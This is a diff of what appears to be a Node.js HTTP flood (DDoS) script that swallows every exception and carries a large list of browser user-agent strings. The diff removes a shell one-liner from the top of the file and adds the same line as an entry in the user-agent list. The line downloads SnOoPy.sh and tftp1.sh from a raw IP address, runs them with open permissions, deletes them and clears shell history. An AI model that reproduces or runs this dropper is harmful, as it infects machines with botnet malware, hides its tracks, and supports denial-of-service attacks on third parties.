@@ -14,8 +14,6 @@ var time = process.argv[3];
 process.on('uncaughtException', function (e) { });
 process.on('unhandledRejection', function (e) { });
 
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.136.104.130/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 150.136.104.130 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c 
-
 const userAgents = [
 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
 "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
@@ -1758,6 +1756,7 @@ const userAgents = [
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
+"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.136.104.130/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 150.136.104.130 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c ",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
